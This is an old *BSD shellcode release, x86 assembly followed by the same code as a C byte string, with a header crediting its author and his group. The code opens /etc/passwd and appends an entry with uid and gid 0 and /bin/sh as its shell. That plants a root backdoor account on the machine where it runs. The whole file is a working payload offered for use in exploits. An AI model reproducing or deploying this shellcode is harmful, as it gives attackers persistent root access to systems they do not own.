/*************************************************************
writes the line for user in /etc/passwd with uid&gid == 0
OS: *BSD
length: 74
	written by dev0id dev0id@mail.ru (rootteam.void.ru)
	  		  #rus-sec /Efnet.org
greetz:
	mig
	nerf

*************************************************************
BITS 32
main:
	xor	eax,eax
	push	eax
	push byte 0x64
	push word 0x7773
	push long 0x7361702f
	push long 0x6374652f
	mov	ebx,esp
	mov	al,0x0a
	push	eax
	push	ebx
	mov	al,5
	push	eax
	int	0x80


	mov	edx,eax

	push long 0x0a206873
	push long 0x2f6e6962
	push long 0x2f3a2f3a
	push long 0x313a303a
	push long 0x303a3a31
	mov ebx,esp
	mov	al,20
	push	eax
	push	ebx
	push	edx
	mov	al,4
	push	eax
	int	0x80

	mov	al,1
	push	eax
	int	0x80

*************************************************************



char shellcode[] =
	"\x31\xc0\x50\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68"
	"\x2f\x65\x74\x63\x89\xe3\xb0\x0a\x50\x53\xb0\x05\x50\xcd\x80"
	"\x89\xc2\x68\x73\x68\x20\x0a\x68\x62\x69\x6e\x2f\x68\x3a\x2f"
	"\x3a\x2f\x68\x3a\x30\x3a\x31\x68\x31\x3a\x3a\x30\x89\xe3\xb0"
	"\x14\x50\x53\x52\xb0\x04\x50\xcd\x80\xb0\x01\x50\xcd\x80";